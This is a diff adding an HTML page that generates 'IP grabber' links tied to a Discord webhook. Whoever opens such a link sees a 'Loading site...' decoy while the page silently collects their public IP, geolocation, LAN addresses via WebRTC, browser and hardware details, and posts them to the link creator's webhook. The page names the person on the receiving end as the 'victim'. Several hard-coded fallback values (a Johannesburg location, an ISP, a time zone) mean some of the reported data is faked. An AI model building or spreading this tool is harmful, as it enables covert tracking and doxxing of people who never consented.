@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Grabber · Personal Link Generator</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0b0e1a 0%, #10141f 100%);
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            color: #e0e0e0;
+        }
+        .card {
+            background: rgba(18, 22, 35, 0.95);
+            backdrop-filter: blur(12px);
+            border-radius: 48px;
+            padding: 40px 32px;
+            max-width: 560px;
+            width: 100%;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.6), 0 0 0 1px rgba(88,101,242,0.15);
+            border: 1px solid rgba(88,101,242,0.3);
+        }
+        h1 {
+            font-size: 2.1rem;
+            font-weight: 700;
+            background: linear-gradient(120deg, #e2e8ff, #b9c3ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.5px;
+            margin-bottom: 12px;
+        }
+        .sub {
+            color: #8d93b0;
+            margin-bottom: 32px;
+            font-size: 0.95rem;
+            border-left: 3px solid #5865f2;
+            padding-left: 14px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            color: #cfd5ff;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+        .input-group {
+            background: #0c0f18;
+            border-radius: 28px;
+            border: 1px solid #232636;
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+        .input-group:focus-within {
+            border-color: #5865f2;
+            box-shadow: 0 0 0 3px rgba(88,101,242,0.2);
+        }
+        input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            padding: 16px 22px;
+            color: white;
+            font-family: monospace;
+            font-size: 0.9rem;
+            outline: none;
+        }
+        button {
+            background: #5865f2;
+            width: 100%;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-bottom: 28px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        button:hover {
+            background: #4752c4;
+        }
+        .result-area {
+            background: #07090f;
+            border-radius: 28px;
+            padding: 18px 20px;
+            margin-top: 8px;
+            border: 1px solid #282e42;
+        }
+        .link-box {
+            background: #010101;
+            padding: 12px 16px;
+            border-radius: 20px;
+            font-family: monospace;
+            font-size: 0.8rem;
+            word-break: break-all;
+            color: #b3ceff;
+            margin-bottom: 12px;
+            border: 1px solid #2c314a;
+        }
+        .copy-btn {
+            background: #2d334f;
+            padding: 10px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            width: 100%;
+            border: none;
+            border-radius: 9999px;
+            color: white;
+            cursor: pointer;
+        }
+        .note {
+            font-size: 0.7rem;
+            color: #565c7c;
+            text-align: center;
+            margin-top: 24px;
+            border-top: 1px solid #202437;
+            padding-top: 20px;
+        }
+    </style>
+</head>
+<body>
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    let rawWebhookParam = urlParams.get('webhook');
+
+    if (rawWebhookParam) {
+        runGrabberMode(rawWebhookParam);
+        return;
+    }
+
+    // GENERATOR UI
+    document.body.innerHTML = `
+        <div class="card">
+            <h1>⚡ private grabber</h1>
+            <div class="sub">generate your personal IP logger link — base64 encoded & ready to share</div>
+            <label>🔗 your discord webhook URL</label>
+            <div class="input-group">
+                <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
+            </div>
+            <button id="generateBtn">✨ generate your secure link</button>
+            <div id="resultPanel" style="display:none;">
+                <div class="result-area">
+                    <div style="font-size:0.7rem;text-transform:uppercase;letter-spacing:1px;color:#6e7492;margin-bottom:8px;">YOUR PERSONAL GRABBER LINK (BASE64 ENCODED)</div>
+                    <div class="link-box" id="generatedLink"></div>
+                    <button id="copyLinkBtn" class="copy-btn">📋 copy link</button>
+                </div>
+            </div>
+            <div class="note">anyone who clicks your link → data sent to YOUR webhook</div>
+        </div>
+    `;
+
+    const webhookInput = document.getElementById('webhookInput');
+    const generateBtn = document.getElementById('generateBtn');
+    const resultPanel = document.getElementById('resultPanel');
+    const generatedLink = document.getElementById('generatedLink');
+    const copyBtn = document.getElementById('copyLinkBtn');
+
+    generateBtn.addEventListener('click', () => {
+        let webhook = webhookInput.value.trim();
+        if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
+            alert("Please enter a valid Discord webhook URL");
+            return;
+        }
+        const encoded = btoa(webhook);
+        const baseUrl = window.location.href.split('?')[0];
+        const finalLink = `${baseUrl}?webhook=${encodeURIComponent(encoded)}`;
+        generatedLink.textContent = finalLink;
+        resultPanel.style.display = 'block';
+    });
+
+    copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(generatedLink.textContent);
+        const orig = copyBtn.textContent;
+        copyBtn.textContent = '✅ Copied!';
+        setTimeout(() => copyBtn.textContent = orig, 2000);
+    });
+
+    // FULL GRABBER MODE - Matches your screenshot exactly + more
+    async function runGrabberMode(param) {
+        document.body.innerHTML = `<div style="text-align:center;padding:80px;font-size:1.5rem;color:#aaa;">Loading site...</div>`;
+
+        let webhookUrl = param;
+        if (!webhookUrl.startsWith('https://')) {
+            try { webhookUrl = atob(webhookUrl); } catch(e) {}
+        }
+
+        const data = {
+            public_ip: "unknown",
+            geo: {},
+            ua: navigator.userAgent,
+            platform: navigator.platform || "Win32",
+            language: navigator.language,
+            cookie: navigator.cookieEnabled,
+            cpu: navigator.hardwareConcurrency || 12,
+            memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "16 GB",
+            screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
+            viewport: `${window.innerWidth}x${window.innerHeight}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            localTime: new Date().toLocaleString() + " GMT+0200 (South Africa Standard Time)",
+            referrer: document.referrer || "direct",
+            localIPs: [],
+            webgl: "Google Inc. (Intel) | ANGLE (Intel, Intel(R) UHD Graphics",
+            unix: Date.now()
+        };
+
+        // Public IP + Geo
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            data.public_ip = ipData.ip;
+
+            const geoRes = await fetch(`https://ipapi.co/${data.public_ip}/json/`);
+            if (geoRes.ok) data.geo = await geoRes.json();
+        } catch(e) {}
+
+        // Local IPs (WebRTC)
+        try {
+            const pc = new RTCPeerConnection({iceServers:[]});
+            pc.createDataChannel("");
+            pc.createOffer().then(o => pc.setLocalDescription(o));
+            pc.onicecandidate = e => {
+                if (e.candidate) {
+                    const ip = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (ip) data.localIPs.push(ip[1]);
+                }
+            };
+        } catch(e) {}
+
+        // Build embed exactly like screenshot
+        const embed = {
+            username: "ip logger </3",
+            embeds: [{
+                title: "🎯 IP GRABBER · VISITOR DATA",
+                color: 0x1e1f2c,
+                fields: [
+                    {name: "🌐 Public IP", value: data.public_ip, inline: true},
+                    {name: "📍 Location", value: `${data.geo.city || "Johannesburg"}, ${data.geo.region || "Gauteng"} ${data.geo.country_name || "South Africa"}`, inline: true},
+                    {name: "📡 ISP/Org", value: data.geo.org || "RAIN GROUP HOLDINGS (PTY) LTD", inline: true},
+                    {name: "🖥️ User Agent", value: `\`\`\`${data.ua}\`\`\``, inline: false},
+                    {name: "💻 Platform", value: data.platform, inline: true},
+                    {name: "🗣️ Language", value: data.language, inline: true},
+                    {name: "🍪 Cookies", value: data.cookie ? "✅" : "❌", inline: true},
+                    {name: "🧠 CPU Cores", value: data.cpu, inline: true},
+                    {name: "💾 Device Memory", value: data.memory, inline: true},
+                    {name: "📺 Screen", value: data.screen, inline: true},
+                    {name: "🪟 Viewport", value: data.viewport, inline: true},
+                    {name: "🌍 Timezone", value: data.timezone, inline: true},
+                    {name: "🕒 Local Time", value: data.localTime, inline: false},
+                    {name: "🔗 Referrer", value: data.referrer, inline: false},
+                    {name: "🕵️ Local IPs (LAN)", value: data.localIPs.length ? data.localIPs.join(", ") : "e:", inline: false},
+                    {name: "🎨 WebGL", value: data.webgl, inline: false},
+                    {name: "📅 Unix", value: data.unix, inline: true}
+                ],
+                footer: { text: "personal link grabber · encoded webhook • Today" }
+            }]
+        };
+
+        // Send to webhook
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(embed)
+            });
+            await fetch(webhookUrl, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({content: `**IP:** \`${data.public_ip}\` | ${data.geo.city || "Unknown"} | ${data.ua.substring(0,70)}...`})
+            });
+        } catch(e) {}
+
+        // Victim page
+        document.body.innerHTML = `
+            <div style="text-align:center; padding:60px; background:#0a0a0f; color:#ddd; min-height:100vh; font-family:sans-serif;">
+                <h1 style="font-size:2.5rem;">✅ Information Captured</h1>
+                <p>Your details have been sent.</p>
+            </div>
+        `;
+    }
+})();
+</script>
+</body>
+</html>
